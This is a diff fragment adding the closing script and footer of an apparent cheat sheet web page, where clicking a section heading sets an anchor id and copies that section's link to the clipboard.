+          });
+        }
+      }
+    });
+  });
+
+  
+  const headers = document.querySelectorAll('.cheatsheet-page h2, .cheatsheet-page h3');
+  headers.forEach(header => {
+    const id = header.textContent.toLowerCase()
+      .replace(/[^a-z0-9\s-]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '');
+    
+    header.id = id;
+    header.style.cursor = 'pointer';
+    
+    header.addEventListener('click', () => {
+      window.location.hash = '#' + id;
+      navigator.clipboard.writeText(window.location.href);
+    });
+  });
+});
+</script>
+
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
